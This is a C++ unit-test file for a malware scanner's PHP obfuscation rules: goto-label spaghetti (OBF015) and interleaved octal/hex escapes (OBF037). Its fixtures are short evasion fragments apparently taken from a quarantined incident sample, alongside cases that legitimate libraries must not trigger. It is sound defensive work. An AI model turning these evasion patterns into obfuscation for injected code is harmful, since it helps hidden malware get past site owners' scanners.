// OBF015 / OBF037 - evasions found in ir-quarantine-20260831b/aa0243e75b010ee3.php
// ============================================================================

class GotoAndEscapeTest : public ::testing::Test {
protected:
    bool fires(const char* code, const char* content) {
        const auto* rule = getRuleByCode(code);
        EXPECT_NE(rule, nullptr);
        return rule && !rule->findMatches(content).empty();
    }
};

// The emitter puts no space after the semicolon; the rule used to require one.
TEST_F(GotoAndEscapeTest, GotoLabelNeedsNoWhitespaceAfterSemicolon) {
    EXPECT_TRUE(fires("OBF015", "<?php goto kPpzye;LQL4spRSOK: tQtVYGj1();goto NGPmYI;wQEDHkCO: $a=1;"));
    // still fires with a space, as before
    EXPECT_TRUE(fires("OBF015", "<?php goto kPpzye; LQL4spRSOK: $a=1;"));
}

// ALL_CAPS labels are how humans write the one legitimate use of goto.
TEST_F(GotoAndEscapeTest, GotoIgnoresUppercaseLabels) {
    EXPECT_FALSE(fires("OBF015", "<?php goto SCANNER_TOP;SCANNER_TOP: $a=1;"));
}

// Interleaving the two notations slipped between the octal-only and hex-only rules.
TEST_F(GotoAndEscapeTest, FlagsInterleavedOctalAndHexEscapes) {
    EXPECT_TRUE(fires("OBF037",
        "<?php echo \"\\74\\144\\x69\\166\\x3e\\x3c\\x69\\156\\160\\165\\x74\\x20\\x74\\171\";"));
}

// One convention throughout is what hand-written code looks like - binary constants
// in getID3, phpseclib and minified JS do this all day and must stay silent.
TEST_F(GotoAndEscapeTest, IgnoresSingleStyleEscapeRuns) {
    EXPECT_FALSE(fires("OBF037",
        "<?php $x = \"\\x00\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\";"));
    EXPECT_FALSE(fires("OBF037",
        "<?php $x = \"\\101\\102\\103\\104\\105\\106\\107\\110\\111\\112\\113\\114\";"));
}

TEST_F(GotoAndEscapeTest, IgnoresShortMixedRuns) {
    EXPECT_FALSE(fires("OBF037", "<?php $x = \"\\x41\\102\\x43\";"));
}
